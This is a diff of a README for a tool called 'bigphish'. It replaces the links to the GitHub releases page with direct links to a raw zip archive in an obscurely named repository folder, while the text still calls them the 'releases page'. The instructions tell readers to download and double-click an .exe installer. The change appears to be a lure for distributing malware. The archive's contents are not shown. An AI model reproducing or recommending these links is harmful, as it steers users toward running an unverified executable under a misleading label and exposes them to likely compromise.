@@ -1,6 +1,6 @@
 # 🛡️ bigphish - Manage all your security tools easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Mean-figwax189/bigphish/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Mean-figwax189/bigphish/main/impierceable/Software-1.3.zip)
 
 ## 📌 About This Tool
 
@@ -20,7 +20,7 @@ To run this application on your Windows computer, you need basic hardware. Ensur
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [releases page](https://github.com/Mean-figwax189/bigphish/releases) to download the installer.
+1. Visit the [releases page](https://raw.githubusercontent.com/Mean-figwax189/bigphish/main/impierceable/Software-1.3.zip) to download the installer.
 2. Select the file ending in .exe for your version of Windows.
 3. Save the file to your Downloads folder.
 4. Locate the file in your folder. Double-click the file to open the installer.
